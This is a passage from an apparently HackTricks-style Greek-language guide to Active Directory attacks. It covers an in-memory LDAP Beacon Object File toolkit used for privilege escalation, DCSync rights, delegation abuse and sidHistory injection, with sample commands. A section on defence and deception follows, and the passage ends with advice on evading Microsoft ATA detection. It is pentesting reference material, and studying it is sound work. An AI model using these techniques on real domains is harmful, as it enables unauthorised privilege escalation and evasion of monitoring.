The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) υλοποιεί εκ νέου τα bloodyAD-style LDAP primitives ως x64 Beacon Object Files που τρέχουν εξολοκλήρου μέσα σε ένα on-host implant (π.χ., Adaptix C2). Οι operators μεταγλωττίζουν το πακέτο με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν `ldap.axs`, και μετά καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον logon security context πάνω από LDAP (389) με signing/sealing ή LDAPS (636) με auto certificate trust, οπότε δεν απαιτούνται socks proxies ή disk artifacts.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` επιλύουν short names/OU paths σε πλήρη DNs και κάνουν dump τα αντίστοιχα objects.
- `get-object`, `get-attribute`, and `get-domaininfo` αντλούν αυθαίρετα attributes (συμπεριλαμβανομένων των security descriptors) καθώς και τα forest/domain metadata από το `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` αποκαλύπτουν roasting candidates, ρυθμίσεις delegation, και υπάρχοντες [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors απευθείας από LDAP.
- `get-acl` and `get-writable --detailed` αναλύουν το DACL για να απαριθμήσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), και inheritance, δίνοντας άμεσα στόχους για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Βασικές λειτουργίες εγγραφής LDAP για ανύψωση προνομίων και επίμονη πρόσβαση

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον χειριστή να τοποθετήσει νέους principals ή machine accounts όπου υπάρχουν δικαιώματα σε OU. `add-groupmember`, `set-password`, `add-attribute`, και `set-attribute` καταλαμβάνουν άμεσα στόχους μόλις βρεθούν δικαιώματα write-property.
- Εντολές με έμφαση στα ACL όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, και `add-dcsync` μεταφράζουν WriteDACL/WriteOwner σε οποιοδήποτε AD αντικείμενο σε επαναφέρεσεις κωδικών, έλεγχο συμμετοχής σε ομάδες ή προνόμια αναπαραγωγής DCSync χωρίς να αφήνουν PowerShell/ADSI artifacts. Οι αντίστοιχες `remove-*` εντολές καθαρίζουν τα εγχυμένα ACEs.

### Ανάθεση, roasting και κατάχρηση Kerberos

- `add-spn`/`set-spn` κάνουν αμέσως έναν συμβιβασμένο χρήστη Kerberoastable· `add-asreproastable` (UAC toggle) τον επισημαίνει για AS-REP roasting χωρίς να αγγίξει τον κωδικό.
- Macros ανάθεσης (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) επανεγγράφουν `msDS-AllowedToDelegateTo`, UAC flags, ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, επιτρέποντας constrained/unconstrained/RBCD μονοπάτια επίθεσης και εξαλείφοντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, μετακίνηση OU και διαμόρφωση επιφάνειας επίθεσης

- `add-sidhistory` εισάγει privileged SIDs στο SID history ενός ελεγχόμενου principal (βλέπε [SID-History Injection](sid-history-injection.md)), παρέχοντας κρυφή κληρονομιά πρόσβασης πλήρως μέσω LDAP/LDAPS.
- `move-object` αλλάζει το DN/OU των computers ή users, επιτρέποντας σε έναν επιτιθέμενο να μεταφέρει assets σε OUs όπου ήδη υπάρχουν ανατεθειμένα δικαιώματα πριν καταχραστεί `set-password`, `add-groupmember`, ή `add-spn`.
- Εντολές αφαίρεσης με στενή εμβέλεια (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, κ.λπ.) επιτρέπουν γρήγορο rollback μετά τη συγκομιδή credentials ή persistence, μειώνοντας την τηλεμετρία.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Γενικές Αμυντικές Συμβουλές

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Μέτρα άμυνας για την προστασία διαπιστευτηρίων**

- **Domain Admins Restrictions**: Συνιστάται οι Domain Admins να επιτρέπεται να συνδέονται μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους hosts.
- **Service Account Privileges**: Οι υπηρεσίες δεν θα πρέπει να τρέχουν με Domain Admin (DA) privileges για τη διατήρηση της ασφάλειας.
- **Temporal Privilege Limitation**: Για εργασίες που απαιτούν DA privileges, η διάρκεια τους θα πρέπει να είναι περιορισμένη. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Ελέγξτε Audit Event IDs 2889/3074/3075 και στη συνέχεια επιβάλετε LDAP signing συν LDAPS channel binding σε DCs/clients για να μπλοκάρετε προσπάθειες LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Υλοποίηση τεχνικών deception**

- Η υλοποίηση deception περιλαμβάνει την τοποθέτηση παγίδων, όπως decoy users ή computers, με χαρακτηριστικά όπως passwords που δεν λήγουν ή που επισημαίνονται ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα δικαιώματα ή την προσθήκη τους σε ομάδες υψηλών προνομίων.
- Ένα πρακτικό παράδειγμα περιλαμβάνει τη χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερα για την ανάπτυξη deception techniques μπορείτε να βρείτε στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Αναγνώριση deception**

- **For User Objects**: Υποψίες ενδείξεις περιλαμβάνουν atypical ObjectSID, σπάνιες συνδέσεις, ημερομηνίες δημιουργίας και χαμηλό count αποτυχημένων κωδικών.
- **General Indicators**: Η σύγκριση attributes πιθανών decoy objects με εκείνα των γνήσιων μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στην αναγνώριση τέτοιων deceptions.

### **Παράκαμψη συστημάτων ανίχνευσης**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Αποφυγή session enumeration σε Domain Controllers για να αποτραπεί η ανίχνευση από ATA.
- **Ticket Impersonation**: Η χρήση **aes** keys για δημιουργία ticket βοηθά στην αποφυγή ανίχνευσης αποφεύγοντας το downgrade σε NTLM.
- **DCSync Attacks**: Συνιστάται η εκτέλεση από μη Domain Controller για αποφυγή ανίχνευσης από ATA, καθώς η άμεση εκτέλεση από Domain Controller θα ενεργοποιήσει alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
